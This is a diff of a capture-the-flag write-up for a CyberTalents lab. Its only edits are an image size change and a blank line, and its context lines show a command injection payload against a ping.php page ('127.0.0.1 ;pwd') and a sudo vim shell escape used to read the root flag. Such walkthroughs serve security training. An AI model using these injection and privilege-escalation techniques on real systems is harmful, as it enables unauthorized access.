@@ -49,7 +49,7 @@ First of all, you should connect to CyberTalents VPN or public ip
 
   * I found ping.php
   
-<img src="/img/injector/browser2.PNG" alt="Getting-gz" width="800" height="330">
+<img src="/img/injector/browser2.PNG" alt="Getting-gz" width="800" height="250">
 
  *  i found command injection
  * `127.0.0.1 ;pwd`
@@ -100,6 +100,7 @@ First of all, you should connect to CyberTalents VPN or public ip
   * search about use vim in privesc
   * `sudo vim -c ' : ! /bin/sh ' /usr/bin/vim`
   * `cat /root/root.txt`
+  
 <img src="/img/injector/roo.PNG" alt="Getting-gz" width="800" height="100">
 
 * We got the final flag and complete task
